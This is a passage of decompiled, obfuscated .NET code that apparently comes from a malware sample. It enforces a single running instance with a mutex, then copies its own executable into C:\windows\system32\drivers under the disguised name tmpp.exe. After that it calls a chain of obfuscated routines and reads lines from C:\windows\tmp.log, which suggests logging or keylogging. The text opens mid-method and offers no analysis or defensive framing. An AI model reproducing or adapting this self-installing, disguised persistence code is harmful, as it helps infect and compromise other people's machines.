					goto IL_0208;
					IL_01eb:
					num = 24;
					mutex_0.Close();
					goto IL_01f9;
					IL_01f9:
					num = 25;
					mutex_0 = null;
					ProjectData.EndApp();
					goto IL_0208;
					IL_0208:
					num = 28;
					mutex_0 = new Mutex(initiallyOwned: false, string_2);
					goto IL_021d;
					IL_021d:
					num = 29;
					if (!mutex_0.WaitOne(0, exitContext: false))
					{
						goto IL_0232;
					}
					goto IL_024f;
					IL_0232:
					num = 30;
					mutex_0.Close();
					goto IL_0240;
					IL_0240:
					num = 31;
					mutex_0 = null;
					ProjectData.EndApp();
					goto IL_024f;
					IL_024f:
					num = 34;
					if (!File.Exists("C:\\windows\\system32\\drivers\\tmpp.exe"))
					{
						goto IL_0264;
					}
					goto IL_0349;
					IL_0264:
					num = 35;
					File.Copy(Assembly.GetExecutingAssembly().Location, "C:\\windows\\system32\\drivers\\tmpp.exe");
					goto IL_0349;
					IL_0349:
					num = 38;
					Class11.smethod_0();
					goto IL_0280;
					IL_0280:
					num = 39;
					Class9.smethod_0();
					goto IL_0288;
					IL_0288:
					num = 40;
					Class8.smethod_0(Class7.string_0);
					goto IL_0295;
					IL_0295:
					num = 41;
					Class10.smethod_0();
					goto IL_029d;
					IL_029d:
					num = 42;
					Class16.smethod_0();
					goto IL_02a5;
					IL_02a5:
					num = 43;
					Class13.smethod_0();
					goto IL_02ad;
					IL_02ad:
					num = 44;
					Class14.smethod_2();
					goto IL_02b5;
					IL_02b5:
					num = 45;
					Class6.smethod_0();
					goto IL_02bd;
					IL_02bd:
					num = 46;
					Class15.smethod_0();
					goto IL_02c5;
					IL_02c5:
					num = 47;
					list = new List<string>();
					goto IL_02ce;
					IL_02ce:
					num = 48;
					using (StringReader stringReader = new StringReader("C:\\windows\\tmp.log"))
					{
						while (stringReader.Peek() > -1)
						{
							string text = stringReader.ReadLine();
							if (Operators.CompareString(text, "", false) != 0)
							{
								list.Add(text);
							}
						}
					}
					goto IL_0326;
					IL_0326:
					num = 50;
					array = list.ToArray();
					num5 = 0;
					goto IL_033f;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 1089;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
